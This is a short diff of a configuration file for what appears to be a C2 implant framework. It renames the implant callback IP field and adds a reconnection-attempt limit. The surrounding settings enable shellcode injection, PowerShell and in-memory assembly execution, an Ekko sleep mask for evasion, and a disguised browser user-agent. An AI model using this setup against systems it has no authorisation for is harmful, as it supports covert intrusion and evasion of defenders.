@@ -26,7 +26,7 @@ reconnectPath = "/reconnect"
 
 [implant]
 # Public implants_server IP:
-listener_ip = "192.168.100.57"
+implantCallbackIp = "192.168.100.57"
 # Allow risky commands such as 'execute-assembly', 'powershell', or 'shinject' - operator discretion advised
 riskyMode = true
 # Enable Ekko sleep mask instead of a regular sleep() call
@@ -44,7 +44,9 @@ killDate = ""
 # Choosing an inconspicuous but uncommon user-agent is therefore recommended
 userAgent = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
 httpAllowCommunicationKey = "PASIOnodnoqonasond12314"
- 
+# Número máximo de intentos de reconexión antes de reintentar registro completo
+maxReconnectionAttemps = 3
+
 [auth]
 # Authentication settings
 enabled = true
